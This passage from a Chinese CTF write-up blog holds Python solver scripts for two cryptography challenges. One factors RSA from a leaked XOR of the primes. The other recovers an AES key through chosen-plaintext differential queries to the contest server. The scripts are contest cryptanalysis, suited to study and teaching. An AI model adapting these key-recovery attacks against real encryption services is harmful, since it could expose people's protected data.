class="line">    D = s*s - <span class="number">4</span>*n</span><br><span class="line">    <span class="keyword">if</span> D &lt; <span class="number">0</span> <span class="keyword">or</span> <span class="keyword">not</span> is_square(D): <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    r = math.isqrt(D)</span><br><span class="line">    p = (s - r)//<span class="number">2</span>; q = (s + r)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> p*q != n <span class="keyword">or</span> p &lt;= <span class="number">1</span> <span class="keyword">or</span> q &lt;= <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> (p, q) <span class="keyword">if</span> p &lt;= q <span class="keyword">else</span> (q, p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============= stage1: XOR-only（2-adic） =============</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor_xor_only</span>(<span class="params">n: <span class="built_in">int</span>, x: <span class="built_in">int</span>, verbose: <span class="built_in">bool</span>=<span class="literal">False</span></span>) -&gt; <span class="type">Optional</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>,<span class="built_in">int</span>]]:</span><br><span class="line">    <span class="comment"># n odd, p,q odd ⇒ LSB(x)=0</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> (x &amp; <span class="number">1</span>) != <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    cands: <span class="type">List</span>[<span class="built_in">int</span>] = [<span class="number">1</span>]  <span class="comment"># p 的最低位为 1</span></span><br><span class="line">    target_bits = <span class="built_in">max</span>(n.bit_length(), x.bit_length())</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, target_bits):</span><br><span class="line">        mask = (<span class="number">1</span> &lt;&lt; (k + <span class="number">1</span>)) - <span class="number">1</span></span><br><span class="line">        nx, nn = x &amp; mask, n &amp; mask</span><br><span class="line">        base = <span class="number">1</span> &lt;&lt; k</span><br><span class="line">        new: <span class="type">List</span>[<span class="built_in">int</span>] = []</span><br><span class="line">        <span class="keyword">for</span> r_ <span class="keyword">in</span> cands:</span><br><span class="line">            p0 = r_</span><br><span class="line">            <span class="keyword">if</span> ((p0 * (p0 ^ nx)) &amp; mask) == nn:</span><br><span class="line">                new.append(p0)</span><br><span class="line">            p1 = r_ | base</span><br><span class="line">            <span class="keyword">if</span> ((p1 * (p1 ^ nx)) &amp; mask) == nn:</span><br><span class="line">                new.append(p1)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> new:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        cands = <span class="built_in">list</span>(<span class="built_in">dict</span>.fromkeys(new))</span><br><span class="line">        <span class="keyword">if</span> verbose <span class="keyword">and</span> (k % <span class="number">32</span> == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(cands) &gt; <span class="number">300</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[XOR k=<span class="subst">&#123;k&#125;</span>] cand=<span class="subst">&#123;<span class="built_in">len</span>(cands)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> cands:</span><br><span class="line">        <span class="keyword">if</span> p &gt; <span class="number">1</span> <span class="keyword">and</span> n % p == <span class="number">0</span>:</span><br><span class="line">            q = n // p</span><br><span class="line">            <span class="keyword">if</span> (p ^ q) == x:</span><br><span class="line">                <span class="keyword">return</span> (p, q) <span class="keyword">if</span> p &lt;= q <span class="keyword">else</span> (q, p)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ============= stage2(A/B) 原方法（保留但不再使用） =============</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor_and_modinv</span>(<span class="params">*args, **kwargs</span>):  <span class="comment"># 保留占位，避免误用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor_and_iter</span>(<span class="params">*args, **kwargs</span>):    <span class="comment"># 保留占位，避免误用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ============= stage flows =============</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stage1_solve</span>(<span class="params">sock: socket.socket, init_text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    text = init_text</span><br><span class="line">    <span class="comment"># 服务器通常先等你回一行</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;n=&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> text.lower():</span><br><span class="line">        send_line(sock, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        text += recv_until_quiet(sock, total_wait=<span class="number">6.0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;n=&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> text.lower():</span><br><span class="line">        send_line(sock, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">        text += recv_until_quiet(sock, total_wait=<span class="number">4.0</span>)</span><br><span class="line"></span><br><span class="line">    fields = parse_fields(text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> fields <span class="keyword">or</span> (<span class="string">&quot;gift1&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> fields <span class="keyword">and</span> <span class="string">&quot;xor&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> fields <span class="keyword">and</span> <span class="string">&quot;x&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> fields):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;stage1: failed to obtain n/gift1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    n = fields[<span class="string">&quot;n&quot;</span>]</span><br><span class="line">    x = fields.get(<span class="string">&quot;gift1&quot;</span>) <span class="keyword">or</span> fields.get(<span class="string">&quot;xor&quot;</span>) <span class="keyword">or</span> fields.get(<span class="string">&quot;x&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pq = factor_xor_only(n, x)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pq:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;stage1: XOR-only factoring failed&quot;</span>)</span><br><span class="line">    p, q = pq</span><br><span class="line">    p_small = <span class="built_in">min</span>(p, q)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[stage1] p = <span class="subst">&#123;p_small&#125;</span>&quot;</span>)</span><br><span class="line">    send_line(sock, <span class="built_in">str</span>(p_small))</span><br><span class="line">    tail = recv_until_quiet(sock, total_wait=<span class="number">10.0</span>)  <span class="comment"># 第二关提示</span></span><br><span class="line">    <span class="keyword">return</span> tail <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stage2_solve</span>(<span class="params">sock: socket.socket, init_text: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 method: <span class="built_in">str</span> = <span class="string">&quot;inv&quot;</span>, inv_beam: <span class="built_in">int</span> = <span class="number">150000</span>, inv_bucket_bits: <span class="built_in">int</span> = <span class="number">16</span>,</span></span><br><span class="line"><span class="params">                 iter_beam: <span class="built_in">int</span> = <span class="number">150000</span>, verbose: <span class="built_in">bool</span>=<span class="literal">False</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    按你的要求：不处理第二关数据，直接发送 &#x27;1&#x27; 作为占位符，读取后续输出。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    text = init_text <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;n=&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> text.lower():</span><br><span class="line">        send_line(sock, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        text += recv_until_quiet(sock, total_wait=<span class="number">6.0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[stage2] 直接发送占位符 &#x27;1&#x27; 以触发 flag 输出&quot;</span>)</span><br><span class="line">    send_line(sock, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    resp = recv_until_quiet(sock, total_wait=<span class="number">12.0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 尝试提取 flag（常见形如 NAME&#123;...&#125;）</span></span><br><span class="line">    m = re.search(<span class="string">r&quot;[A-Za-z0-9_]+\\&#123;[^\\&#125;]+\\&#125;&quot;</span>, resp)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[flag] <span class="subst">&#123;m.group(<span class="number">0</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============= 主程序（地址端口已写死） =============</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    ap = argparse.ArgumentParser(description=<span class="string">&quot;CTF factor/xor solver (2 stages, robust)&quot;</span>)</span><br><span class="line">    <span class="comment"># 去掉 --host/--port；其余参数保留以兼容你的使用习惯</span></span><br><span class="line">    ap.add_argument(<span class="string">&quot;--init-wait&quot;</span>, <span class="built_in">type</span>=<span class="built_in">float</span>, default=<span class="number">6.0</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--method&quot;</span>, choices=[<span class="string">&quot;inv&quot;</span>,<span class="string">&quot;iter&quot;</span>,<span class="string">&quot;auto&quot;</span>], default=<span class="string">&quot;inv&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--inv-beam&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">150000</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--inv-bucket-bits&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">16</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--beam&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">150000</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--verbose&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>)</span><br><span class="line">    args = ap.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> socket.create_connection((HOST, PORT), timeout=<span class="number">8.0</span>) <span class="keyword">as</span> s:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] connected to <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>&quot;</span>)</span><br><span class="line">            intro = recv_until_quiet(s, total_wait=args.init_wait)</span><br><span class="line">            tail = stage1_solve(s, intro)</span><br><span class="line">            stage2_solve(s, tail,</span><br><span class="line">                         method=args.method,</span><br><span class="line">                         inv_beam=args.inv_beam,</span><br><span class="line">                         inv_bucket_bits=args.inv_bucket_bits,</span><br><span class="line">                         iter_beam=args.beam,</span><br><span class="line">                         verbose=args.verbose)</span><br><span class="line">    <span class="keyword">except</span> MemoryError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] MemoryError：请降低 --inv-beam/--beam。&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] error: <span class="subst">&#123;e&#125;</span>&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121214844282.png"></p><h3 id="crypto-dp-spill"><a href="#crypto-dp-spill" class="headerlink" title="crypto-dp_spill"></a>crypto-dp_spill</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121213143507.png"></p><h3 id="crypto-SBOX-revenge"><a href="#crypto-SBOX-revenge" class="headerlink" title="crypto-SBOX-revenge"></a>crypto-SBOX-revenge</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121201441185.png"></p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">from pwn import *</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import unpad</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">import ast</span><br><span class="line"></span><br><span class="line"># ----------------- 常量，和题目保持一致 -----------------</span><br><span class="line">P = [10, 21, 40, 84, 41, 11, 60, 110, 83, 17, 36, 125, 112, 4, 19, 64, 53, 34, 73, 113,</span><br><span class="line">     108, 57, 103, 8, 12, 58, 27, 117, 51, 126, 47, 111, 14, 99, 116, 25, 30, 1, 37,</span><br><span class="line">     54, 67, 44, 88, 96, 76, 123, 7, 22, 65, 20, 118, 94, 95, 18, 50, 6, 61, 102, 49,</span><br><span class="line">     86, 38, 62, 9, 43, 71, 127, 32, 104, 100, 59, 29, 0, 79, 31, 89, 105, 121, 39,</span><br><span class="line">     75, 91, 114, 2, 81, 28, 97, 106, 3, 24, 87, 80, 93, 120, 66, 5, 72, 101, 23, 56,</span><br><span class="line">     92, 98, 119, 78, 63, 124, 15, 42, 16, 35, 115, 122, 90, 52, 82, 46, 48, 107, 70,</span><br><span class="line">     69, 33, 55, 45, 26, 74, 109, 13, 85, 77, 68]</span><br><span class="line"></span><br><span class="line">S_BOX = [186, 99, 226, 183, 75, 20, 152, 193, 4, 205, 38, 2, 9, 189, 3, 19, 89, 28, 228,</span><br><span class="line">         44, 225, 12, 0, 142, 30, 59, 54, 247, 138, 60, 137, 211, 153, 70, 109, 101,</span><br><span class="line">         130, 27, 252, 234, 77, 241, 132, 49, 46, 190, 214, 115, 184, 122, 199, 76,</span><br><span class="line">         103, 111, 182, 240, 31, 166, 48, 85, 11, 114, 171, 78, 230, 80, 15, 93, 239,</span><br><span class="line">         191, 176, 249, 179, 244, 45, 150, 125, 106, 1, 55, 50, 42, 26, 82, 33, 235,</span><br><span class="line">         135, 91, 22, 217, 128, 127, 254, 216, 221, 156, 104, 36, 229, 79, 227, 117,</span><br><span class="line">         136, 215, 72, 24, 202, 200, 147, 43, 158, 223, 236, 92, 112, 175, 35, 168,</span><br><span class="line">         96, 98, 248, 110, 58, 160, 218, 102, 74, 40, 208, 165, 159, 172, 123, 155,</span><br><span class="line">         178, 149, 177, 34, 154, 198, 185, 88, 64, 170, 207, 139, 162, 140, 144, 90,</span><br><span class="line">         194, 169, 6, 108, 237, 203, 81, 95, 201, 68, 16, 107, 174, 94, 105, 173, 157,</span><br><span class="line">         246, 148, 163, 220, 126, 23, 253, 164, 65, 143, 52, 181, 51, 84, 197, 21, 187,</span><br><span class="line">         113, 224, 63, 195, 32, 53, 151, 243, 250, 73, 120, 39, 134, 251, 188, 233, 87,</span><br><span class="line">         56, 118, 222, 161, 10, 133, 141, 232, 69, 238, 145, 29, 119, 57, 196, 14, 242,</span><br><span class="line">         131, 167, 37, 13, 255, 71, 83, 209, 100, 219, 245, 210, 66, 129, 204, 146, 86,</span><br><span class="line">         17, 212, 192, 231, 47, 206, 62, 61, 67, 18, 124, 8, 41, 97, 116, 25, 5, 7, 213,</span><br><span class="line">         121, 180]</span><br><span class="line"></span><br><span class="line"># 预计算 P 的逆</span><br><span class="line">INP = [0] * 128</span><br><span class="line">for i in range(128):</span><br><span class="line">    INP[P[i] % 128] = i</span><br><span class="line"></span><br><span class="line"># ----------------- 工具函数 -----------------</span><br><span class="line">def int_to_byte_array(n, byte_size=16):</span><br><span class="line">    return [(n &gt;&gt; (8 * i)) &amp; 0xFF for i in range(byte_size)]</span><br><span class="line"></span><br><span class="line">def byte_array_to_int(byte_array):</span><br><span class="line">    return sum(byte &lt;&lt; (8 * i) for i, byte in enumerate(byte_array))</span><br><span class="line"></span><br><span class="line">def int_to_bin_128bit(T):</span><br><span class="line">    return format(T, &#x27;0128b&#x27;)</span><br><span class="line"></span><br><span class="line">def bin_to_int_128bit(b):</span><br><span class="line">    return int(b, 2)</span><br><span class="line"></span><br><span class="line">def P_ex(T):</span><br><span class="line">    bin_T = int_to_bin_128bit(T)</span><br><span class="line">    permuted_bin = [&#x27;0&#x27;] * 128</span><br><span class="line">    for i in range(128):</span><br><span class="line">        permuted_bin[i] = bin_T[P[i] % 128]</span><br><span class="line">    return bin_to_int_128bit(&#x27;&#x27;.join(permuted_bin))</span><br><span class="line"></span><br><span class="line">def P_inv_ex(T):</span><br><span class="line">    bin_T = int_to_bin_128bit(T)</span><br><span class="line">    permuted_bin = [&#x27;0&#x27;] * 128</span><br><span class="line">    for i in range(128):</span><br><span class="line">        permuted_bin[i] = bin_T[INP[i] % 128]</span><br><span class="line">    return bin_to_int_128bit(&#x27;&#x27;.join(permuted_bin))</span><br><span class="line"></span><br><span class="line">def S_ex(b):</span><br><span class="line">    t = b &gt;&gt; 4</span><br><span class="line">    s = b &amp; 0x0F</span><br><span class="line">    return S_BOX[16 * t + s]</span><br><span class="line"></span><br><span class="line"># ----------------- 正式攻击逻辑 -----------------</span><br><span class="line">def solve():</span><br><span class="line">    # 连接远端</span><br><span class="line">    r = remote(&quot;geek.ctfplus.cn&quot;, 32550)</span><br><span class="line"></span><br><span class="line">    # 读 Cipher, IV（都是类似 b&#x27;....&#x27; 的 bytes repr）</span><br><span class="line">    line = r.recvline().strip().decode()</span><br><span class="line">    assert line.startswith(&quot;Cipher=&quot;)</span><br><span class="line">    Cipher = ast.literal_eval(line.split(&quot;=&quot;, 1)[1])</span><br><span class="line"></span><br><span class="line">    line = r.recvline().strip().decode()</span><br><span class="line">    assert line.startswith(&quot;IV=&quot;)</span><br><span class="line">    IV = ast.literal_eval(line.split(&quot;=&quot;, 1)[1])</span><br><span class="line"></span><br><span class="line">    log.info(f&quot;Cipher = &#123;Cipher.hex()&#125;&quot;)</span><br><span class="line">    log.info(f&quot;IV     = &#123;IV.hex()&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 安全的查询函数：发 16 字节二进制 + &#x27;\n&#x27;</span><br><span class="line">    def query_encrypt_block(block: bytes) -&gt; int:</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        block: 必须是 16 bytes，且每个字节都不在空白列表里，</span><br><span class="line">        这样 .strip() 不会删掉我们任何东西。</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        assert len(block) == 16</span><br><span class="line">        # 等提示</span><br><span class="line">        r.recvuntil(b&quot;please Input M&quot;)</span><br><span class="line">        # 发原始 16 字节 + 换行</span><br><span class="line">        r.send(block + b&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">        # 丢掉 &quot;M=...&quot;</span><br><span class="line">        r.recvline()</span><br><span class="line">        # 读 &quot;C=xxx&quot;</span><br><span class="line">        line = r.recvline().strip().decode()</span><br><span class="line">        assert line.startswith(&quot;C=&quot;)</span><br><span class="line">        return int(line.split(&quot;=&quot;, 1)[1])</span><br><span class="line"></span><br><span class="line">    # 先用全 0 block 拿 C0，消掉 key2</span><br><span class="line">    C0 = query_encrypt_block(b&quot;\x00&quot; * 16)</span><br><span class="line">    log.info(f&quot;C0 = &#123;C0&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 所有会被 strip 掉的空白字节</span><br><span class="line">    whitespace_bytes = &#123;0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20&#125;</span><br><span class="line"></span><br><span class="line">    # 选安全字节集：排除所有空白</span><br><span class="line">    safe_vals = [b for b in range(256) if b not in whitespace_bytes]</span><br><span class="line"></span><br><span class="line">    recovered_le = [0] * 16  # little-endian bytes of key1</span><br><span class="line"></span><br><span class="line">    for j in range(16):</span><br><span class="line">        log.info(f&quot;Recovering key byte &#123;j&#125; ...&quot;)</span><br><span class="line">        pairs = []  # (m, y_j)</span><br><span class="line"></span><br><span class="line">        # 对该字节位置，枚举所有安全字节做差分</span><br><span class="line">        for m in safe_vals:</span><br><span class="line">            blk = bytearray(16)</span><br><span class="line">            blk[j] = m</span><br><span class="line">            C = query_encrypt_block(bytes(blk))</span><br><span class="line"></span><br><span class="line">            # 消掉 key2： C ^ C0 = P( S(M^k1) ^ S(0^k1) )</span><br><span class="line">            D = C ^ C0</span><br><span class="line">            # P^&#123;-1&#125; 还原到 S 层：得到 Z_int = S(M^k1) ^ S(k1)</span><br><span class="line">            Z = P_inv_ex(D)</span><br><span class="line">            Z_bytes = int_to_byte_array(Z)</span><br><span class="line">            yj = Z_bytes[j]</span><br><span class="line">            pairs.append((m, yj))</span><br><span class="line"></span><br><span class="line">        # 暴力枚举该字节的 key 值</span><br><span class="line">        candidates = []</span><br><span class="line">        for k in range(256):</span><br><span class="line">            Sk = S_ex(k)</span><br><span class="line">            ok = True</span><br><span class="line">            for m, y in pairs:</span><br><span class="line">                if S_ex(m ^ k) ^ Sk != y:</span><br><span class="line">                    ok = False</span><br><span class="line">                    break</span><br><span class="line">            if ok:</span><br><span class="line">                candidates.append(k)</span><br><span class="line"></span><br><span class="line">        if len(candidates) != 1:</span><br><span class="line">            log.error(f&quot;byte &#123;j&#125; candidates = &#123;candidates&#125;&quot;)</span><br><span class="line">            raise SystemExit(&quot;某个字节候选不唯一，出问题了 QAQ&quot;)</span><br><span class="line"></span><br><span class="line">        recovered_le[j] = candidates[0]</span><br><span class="line">        log.success(f&quot;key1_le[&#123;j&#125;] = &#123;candidates[0]:02x&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    log.success(&quot;Recovered key1 (little-endian bytes) = &quot; +</span><br><span class="line">                &quot; &quot;.join(f&quot;&#123;b:02x&#125;&quot; for b in recovered_le))</span><br><span class="line"></span><br><span class="line">    # 还原整数 key1，再转成 big-endian bytes（等价 long_to_bytes）</span><br><span class="line">    key1_int = byte_array_to_int(recovered_le)</span><br><span class="line">    key1_be = key1_int.to_bytes(16, &quot;big&quot;)</span><br><span class="line">    log.success(f&quot;AES key (big-endian) = &#123;key1_be.hex()&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # AES-CBC 解出 flag</span><br><span class="line">    cipher = AES.new(key1_be, AES.MODE_CBC, IV)</span><br><span class="line">    flag = unpad(cipher.decrypt(Cipher), AES.block_size)</span><br><span class="line"></span><br><span class="line">    print(&quot;\n==== FLAG ====&quot;)</span><br><span class="line">    print(flag)</span><br><span class="line">    print(&quot;==============&quot;)</span><br><span class="line"></span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    context.log_level = &quot;info&quot;</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121201328648.png"></p></div><div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8"><div class="article-copyright-info-container"><ul><li><strong>标题:</strong> 极客大挑战2025wp</li><li><strong>作者:</strong> tiran</li><li><strong>创建于 :</strong> 2025-11-29 20:28:47</li><li><strong>更新于 :</strong> 2025-12-23 14:13:12</li><li><strong>链接:</strong> https://www.tiran.cc/2025/11/29/极客大挑战2025wp/</li><li><strong>版权声明: </strong>本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。</li></ul></div></div><div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8"><div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="next" rel="next" href="/2025/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-2025-ezphp/"><span class="title flex justify-center items-center"><span class="post-nav-title-item truncate max-w-48">第九届强网杯(2025)-ezphp</span> <span class="post-nav-item">下一篇</span> </span><span class="right arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">目录</div><div class="page-title">极客大挑战2025wp</div><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E9%98%BF%E5%9F%BA%E9%87%8C%E6%96%AF%E8%BF%BD%E4%B9%8C%E9%BE%9F"><span class="nav-text">web-阿基里斯追乌龟</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-Vibe-SEO"><span class="nav-text">web-Vibe SEO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-Xross-The-Finish-Line"><span class="nav-text">web-Xross The Finish Line</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-Expression"><span class="nav-text">web-Expression</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-popself"><span class="nav-text">web-popself</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-one-last-image"><span 